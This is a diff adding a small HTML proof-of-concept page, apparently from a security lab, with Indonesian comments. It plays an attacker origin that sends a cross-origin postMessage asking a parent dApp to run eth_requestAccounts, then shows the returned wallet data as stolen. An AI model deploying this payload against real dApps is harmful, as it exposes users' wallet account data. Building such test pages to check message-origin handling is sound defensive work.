@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Attacker Domain - Exploit Script</title>
+</head>
+<body style="background: #1f1313; color: #ff7b72; font-family: monospace; padding: 10px; font-size: 12px;">
+    <h3>Malicious Origin (evil-domain.com)</h3>
+    <p id="status">Menyiapkan serangan postMessage ke dApp utama...</p>
+
+    <script>
+        setTimeout(() => {
+            document.getElementById('status').innerText = "Mengirim payload eksploitasi ke dApp target...";
+            
+            // Mengirim postMessage lintas origin ke halaman utama (dApp target)
+            window.parent.postMessage({
+                action: "EXECUTE_WEB3_CALL",
+                method: "eth_requestAccounts",
+                params: []
+            }, "*");
+        }, 2000);
+
+        // Mendengarkan respons curian dari dApp target
+        window.addEventListener('message', (event) => {
+            if (event.data && event.data.status === "SUCCESS") {
+                document.getElementById('status').innerText = "BERHASIL MENYADAP DATA WALLET!";
+                console.log("Data Sensitif Dicuri:", event.data.result);
+                alert("Eksploitasi Berhasil! Data Akun: " + JSON.stringify(event.data.result));
+            }
+        });
+    </script>
+</body>
+</html>
